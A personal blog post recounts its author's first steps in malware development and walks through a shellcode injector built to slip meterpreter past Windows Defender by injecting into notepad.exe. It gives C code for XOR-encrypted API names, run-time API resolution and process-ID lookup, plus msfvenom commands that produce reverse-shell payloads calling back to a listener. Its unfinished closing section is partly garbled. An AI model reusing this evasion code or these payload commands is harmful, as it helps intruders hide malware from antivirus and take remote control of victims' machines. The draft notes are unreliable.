+++
title = 'My first steps in MalDev'
date = 2024-02-28T20:53:30+01:00
draft = false
showDate = true
description = 'Aweonao'
toc = true
+++
## Prelude
Around this last month I have been digging into the Malware Development world. I have always wanted to expand my knowledge within this field, and I felt like it was the moment to do so. 

As mentioned in many other blogposts, [Sektor7 Malware Development Essentials](https://www.google.com/search?client=firefox-b-d&q=sektor7+malware+development) course was a good point to start. Nevertheless, I found this course very short and I felt like most of the important concepts are ignored (e.g., **what is a handle?**) and are just used like if I already know them.

Because of that, I actually recommend **take a little stop on each of the things that the course shows you in order to UNDERSTAND what does each line do** and also do some personal research on each of the things that the course provides.

I personally made questions like:
- What are the parameters of this function? 
- Why is this function called in the code?
- How could I develop this in a way that it could be more stealthy?
- What are these compile options?

I wanted to make sure that I really learnt from this course and compiling and execute the code they give you is not the way to do it. I personally recommend to watch their videos, take some notes, and reproduce and execute the code in your personal project files. **Do not be scared to improve or modify the code they give you if you think that can be useful.**

The result of following these steps was a final course project in which I included all of the techniques given in the course to avoid detection (mainly static detection, it is a basic course) **combined with am extra technique that made me bypass Windows Defender sandbox analysis.**

Please note that I have just started to learn about these things and that I can be wrong; feel free to contact me at any of my social media to improve the quality of this post and my content overall.

## ¿Evasive? loader/injector

The final project consists on a **shellcode loader/injector (let's use injector from now on)**. 
This shellcode injector **is able to bypass Windows Defender with a meterpreter x64 shellcode at the day of this post (2024/03/05) with Cloud Protection enabled.**

**EDIT**: A week after this post was created, the dropper is not anymore evasive and is detected (dinamically) by Defender. I personally thought that this dropper is not stealthy enough to be evasive and a lot of evasive measures can (and will) be added to this dropper in the future. This has just started :P

This injector has the following properties:
- It is an executable (.EXE) program. No DLL version for now.
- The shellcode is stored as a resource AND "encrypted" using XOR.
- The Windows API calls are calculated in run-time using the [Run-Time Dynamic Linking](https://learn.microsoft.com/en-us/windows/win32/dlls/run-time-dynamic-linking) technique. This corresponds to the [API obfuscation technique](https://unprotect.it/technique/api-obfuscation/) from my fellas of Unprotect Project.
- The strings to calculate the pointer to the API functions using the aforementioned technique are also encrypted with the same XOR key used for the shellcode, in order to obfuscate the strings.
- The XOR key is also stored as a resource in the executable.
- The program in which it injects into is `notepad.exe`. The injector obtains the PID given the process name and uses the PID to inject into. 
- The program is compiled as a **Windows Subsystem program**, and not as a console program, in order to avoid a CMD popping on screen when the dropper gets executed.

The API calls performed in this executable are simple:
- `FindResource` and `LoadResource` to obtain the embedded resources in the executable.
- `VirtualAlloc`, `RtlMoveMemory`, `VirtualAllocEx`, `WriteProcessMemory`, `VirtualProtectEx` and `CreateRemoteThread` for the injection technique.
- `GetProcAddress` and `GetModuleHandle` to perform the IAT hiding technique.
- `CreateToolhelp32Snapshot`, `Process32First` and `Process32Next` to obtain the PID given a process name.

The injector has the following phases:
- It starts obtaining the XOR key from the resources section of the file.
- Using this key to decrypt the string names of the API calls, uses the relevant API functions to obtain the PID from the process name specified as a variable. The process name is hardcoded into the program **as a real malware would do; otherwise, we would need to call this dropper with arguments (not a real case most of the time).** Notepad.exe was used as an example, but it could be performed with more common processes as explorer.exe. Just modify the process name variable inside the dropper.
- The dropper allocates memory in **its own process space and stores the shellcode embedded as a resource in this memory region. Note that the shellcode is stored in this region but not executed, as this is an intermediate step to then move the shellcode to the target process.**
- Using this obtained PID, the injector opens a handle to the process with the given PID and allocates memory space within the process region. The shellcode is then moved from the region that was previously created to this region.
- A remote thread pointing to the remote memory region containing the shellcode is started.

The result is a thread in the remote process executing our shellcode.

## Finding PID given process name
The used Windows API functions to perform the process injection technique require the PID of the process to inject into. A function that dinamically obtains the PID of a given process name at runtime was implemented in the injector using some of the Windows API calls.

The function is the following:

```c
int findMyProc(wchar_t* procname) {

	HANDLE hSnapshot; // Handle to the system process snapshot.
	PROCESSENTRY32 pe;
	int pid = 0;
	BOOL hResult;

	printf("Searching for the process %ls to get its PID...\n", procname);

	// snapshot of all processes in the system
	unsigned char CreateToolhelp32SnapshotEncrypted[] = { 0x2A, 0xC4, 0xAB, 0x42, 0x50, 0x6D, 0xBE, 0x0C, 0x0F, 0xF3, 0xCB, 0xE1, 0x66, 0x62, 0x98, 0xBA, 0xCF, 0xD0, 0x42, 0xC9, 0x58, 0x3B, 0x93, 0xA2, 0xB3 };
	XOR(CreateToolhelp32SnapshotEncrypted, sizeof(CreateToolhelp32SnapshotEncrypted), key, key_len);
	auto const pCreateToolhelp32Snapshot = reinterpret_cast<LPVOID(WINAPI*)(DWORD dwFlags, DWORD th32ProcessID)>(
		GetProcAddress(hKernel32, (LPCSTR)CreateToolhelp32SnapshotEncrypted)
		);
	hSnapshot = pCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapshot == INVALID_HANDLE_VALUE) return 0;

	// It is neccesary to initialize the size of the process entry.
	/* Before calling the Process32First function, set this member to sizeof(PROCESSENTRY32). If you do not initialize dwSize,
	Process32First fails (https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/ns-tlhelp32-processentry32) */
	pe.dwSize = sizeof(PROCESSENTRY32W);

	// Retrieve infrormation about first process encountered in a system snapshot
	unsigned char Process32FirstWEncrypted[] = { 0x39, 0xC4, 0xA1, 0x40, 0x41, 0x7B, 0x99, 0x50, 0x52, 0xD9, 0xCA, 0xF6, 0x79, 0x66, 0xFC, 0x88 };
	XOR(Process32FirstWEncrypted, sizeof(Process32FirstWEncrypted), key, key_len);
	auto const pProcess32FirstW = reinterpret_cast<BOOL(WINAPI*)(HANDLE hSnapshot, LPPROCESSENTRY32 lppe)>(
		GetProcAddress(hKernel32, (LPCSTR)Process32FirstWEncrypted)
		);
	hResult = pProcess32FirstW(hSnapshot, &pe);

	// Get information about the obtained process using its handle
	// and exit if unsuccessful
	unsigned char Process32NextWEncrypted[] = { 0x39, 0xC4, 0xA1, 0x40, 0x41, 0x7B, 0x99, 0x50, 0x52, 0xD1, 0xC6, 0xFC, 0x7E, 0x45, 0xAB };
	XOR(Process32NextWEncrypted, sizeof(Process32NextWEncrypted), key, key_len);
	auto const pProcess32NextW = reinterpret_cast<BOOL(WINAPI*)(HANDLE hSnapshot, LPPROCESSENTRY32 lppe)>(
		GetProcAddress(hKernel32, (LPCSTR)Process32NextWEncrypted)
		);
	while (pProcess32NextW(hSnapshot, &pe)) {
		if (lstrcmpW(pe.szExeFile, procname) == 0) {
			pid = pe.th32ProcessID;
			break;
		}
	}

	// Close the open handle; we don't need it anymore
	CloseHandle(hSnapshot);
	return pid;
}
```

Note that this function **will return the first PID occurrence related to the process specified; if there are two process called notepad.exe, it will return the first one that is found in the snapshot obtained calling `CreateToolhelp32Snapshot`** (a lot of factors influence in the first returned PID).
## Evasion techniques
Here is a detailed overview of each of the things I implemented in the program to make it stealthier, both statically and dinamically. Overall, I think that it is missing a lot of evasion techniques but as I repeated before, I am just learning slowly to know what I am exactly doing without copypasting. 
### Windows Subsystem
The program is compiled specifying `WINDOWS` as the subsystem and not `CONSOLE` as the subsystem in order to avoid the OS allocating a console when the file is executed. 
In order to do this, we first need to compile the file specifying `WINDOWS` as the `SUBSYSTEM` FLAG:

![](/images/post_images/firststeps_1.png)

After that, the linker will not search for the main function; instead, it will search for the following function:
```c
int WINAPI WinMain(HINSTANCE,HISTANCE,LPSTR,int);
```

Therefore we must replace our main function with WinMain:
![](/images/post_images/firststeps_2.png)
### IAT hiding + encrypted strings
The API calls are resolved dinamically, therefore, not appearing in the IAT of the file.
Let's see the snippet of the code to obfuscate an API call:
```c
// VirtualAllocEx\0 char array encrypted with the XOR key
unsigned char VirtualAllocExEncrypted[] = { 0x3F, 0xDF, 0xBC, 0x57, 0x51, 0x69, 0x86, 0x22, 0x0C, 0xF3, 0xCC, 0xE7, 0x4F, 0x6A, 0xAB };
// Decrypting the string
XOR(VirtualAllocExEncrypted, sizeof(VirtualAllocExEncrypted), key, key_len);
// Obtaining the pointer to the VirtualAllocEx function at runtime
auto const pVirtualAllocEx = reinterpret_cast<LPVOID(WINAPI*)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect)>(
		GetProcAddress(GetModuleHandle("kernel32.dll"), (LPCSTR)VirtualAllocExEncrypted)
		);
// Calling the function using the pointer
	lpBufferAddress = pVirtualAllocEx(hOpenProcess, NULL, shellcode_len, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
```

The string is encrypted to not use GetProcAddress and insert the hardcoded "`VirtualAllocEx`" function name. **This would result in the function name appearing as a string in the file.** 
Given this technique, PE analyzers do not display any information about these calls in the IAT nor in the strings. We can see an example with PExplorer, in which none of the used imports is being shown in the IAT:

![](/images/post_images/firststeps.png)

Also, strings related to these calls do not appear in the `strings` section:

![](/images/post_images/firststeps_3.png)

### TBD

Static analysis can also be based on specific byte sequences, or bad bytes in executables.
NOte that PID the frist.
The definition given by [MalwareBytes](https://www.malwarebytes.com/glossary/signature) of a malware signature is as follows:

> In computer security, a signature is a specific pattern that allows cybersecurity technologies to recognize malicious threats, such as a byte sequence in network traffic or known malicious instruction sequences used by families of malware. Signature-based detection, then, is a methodology used by many cybersecurity companies to detect malware that has already been discovered in the wild and cataloged as part of a database.

The phrase: “known malicious instruction sequences used by families of malware” is of particular interest, as it implies that security products are looking for specific byte sequences in executables and are able to identify them as malicious based on just those sequences.

This means that if we are able to accurately identify which byte sequences are being detected as malicious, we can replace them with benign bytes, and evade static detection.

Next, we can pass the executable into a decompiler such as [Ghidra](https://ghidra-sre.org/) and identify the code section that the byte sequence belongs to, we can jump to a memory offset using `G` and provide the offset as: `file ( OFFSET )`

https://steve-s.gitbook.io/0xtriboulet/deceiving-defender/deceiving-defender-name-bypass

Stage: msfvenom --platform windows --arch x64 -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.0.143 LPORT=443 -f raw -o meterpreter EXITFUNC=thread
Non-staged: msfvenom --platform windows --arch x64 -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.143 LPORT=443 -f raw -o meterpreter EXITFUNC=thread




ideas futuras
cambiar el algoritmo de envcriptacion
encriptar con clave en dominio 
encriptar con clave de hostname, asi solo funciona en la target machine.
cambiar los protocolos con los que hablarn (en generar, cambiar el agente xD)
tecnicas mas avanzadas, indirect syscalls
